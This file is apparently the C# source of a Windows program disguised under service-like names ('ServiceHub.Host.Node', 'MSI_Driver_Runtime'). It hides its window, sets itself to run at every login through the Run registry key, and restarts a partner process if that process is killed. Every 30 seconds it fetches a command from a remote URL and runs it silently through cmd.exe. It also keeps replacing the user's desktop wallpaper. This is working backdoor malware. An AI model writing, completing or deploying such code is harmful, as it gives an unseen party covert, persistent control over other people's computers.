using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Windows.Forms;
using System.Threading;
using System.Linq;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace ServiceHub.Host.Node
{
    public partial class Form1 : Form
    {
        private string _recentCommand = string.Empty;
        private Process _sisterProcess;

        public Form1()
        {
            SetStyle(ControlStyles.SupportsTransparentBackColor, true);
            InitializeComponent();
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            int wl = NativeMethods.GetWindowLong(this.Handle, NativeMethods.GWL.ExStyle);
            wl = wl | 0x80000 | 0x20;
            NativeMethods.SetWindowLong(this.Handle, NativeMethods.GWL.ExStyle, wl);
            NativeMethods.SetLayeredWindowAttributes(this.Handle, 0, 128, NativeMethods.LWA.ColorKey);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var Params = base.CreateParams;
                Params.ExStyle |= 0x80;
                return Params;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            while (true)
            {
                _sisterProcess = Process.GetProcessesByName("MSI_Driver_Runtime").FirstOrDefault();
                if (_sisterProcess != null)
                {
                    _sisterProcess.StartInfo.FileName = _sisterProcess.MainModule.FileName;
                    break;
                }

                Thread.Sleep(500);
            }

            setActionTimers();
            setAutoStart(true);
            setRandomWallpaper();
            setPositionBottomRight();
            NativeMethods.SetWindowPos(Handle, Const.HWND_TOPMOST, 0, 0, 0, 0, Const.TOPMOST_FLAGS);
        }

        private void tmrShowForm_Tick(object sender, EventArgs e)
        {
            setRandomWallpaper();
        }

        private void tmrCommand_Tick(object sender, EventArgs e)
        {
            string command = Website.DownloadString(Const.RUN_COMMAND_URL).Trim();
            if (!string.IsNullOrWhiteSpace(command) && command.Length > 1 && command != _recentCommand)
            {
                tmrCommand.Stop();
                Process myProcess = new Process();
                _recentCommand = command;

                myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                myProcess.StartInfo.CreateNoWindow = true;
                myProcess.StartInfo.UseShellExecute = false;
                myProcess.StartInfo.FileName = "cmd.exe";
                myProcess.StartInfo.Arguments = "/c " + command;
                myProcess.EnableRaisingEvents = true;

                myProcess.Exited += MyProcess_Exited;
                myProcess.Start();
                myProcess.WaitForExit();
            }
        }

        private void tmrSisterProcess_Tick(object sender, EventArgs e)
        {
            if (_sisterProcess.HasExited)
                _sisterProcess.Start();
        }

        private void setActionTimers()
        {
            tmrWallpaper.Interval = (int)TimeSpan.FromMinutes(1).TotalMilliseconds;
            tmrWallpaper.Start();

            tmrCommand.Interval = (int)TimeSpan.FromSeconds(30).TotalMilliseconds;
            tmrCommand.Start();
        }

        private void setPositionBottomRight()
        {
            Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
            Location = new Point(workingArea.Right - Size.Width,
                                      workingArea.Bottom - Size.Height);
        }

        private void setAutoStart(bool enabled)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (enabled)
            {
                rk.SetValue(AppDomain.CurrentDomain.FriendlyName, Assembly.GetExecutingAssembly().Location);
            }
            else
            {
                rk.DeleteValue(AppDomain.CurrentDomain.FriendlyName, false);
            }
        }

        private static void setRandomWallpaper()
        {
            Image wallpaper = Properties.Resources.wallpaper;
            string tmpPath = Path.Combine(Path.GetTempPath(), "wallpaper.png");
            wallpaper.Save(tmpPath, ImageFormat.Png);

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

            key.SetValue(@"WallpaperStyle", "1");
            key.SetValue(@"TileWallpaper", "0");

            NativeMethods.SystemParametersInfo(Const.SPI_SETDESKWALLPAPER, 0, tmpPath, Const.SPIF_UPDATEINIFILE | Const.SPIF_SENDWININICHANGE);
            File.Delete(tmpPath);
        }

        private void MyProcess_Exited(object sender, EventArgs e)
        {
            tmrCommand.Start();
        }
    }
}
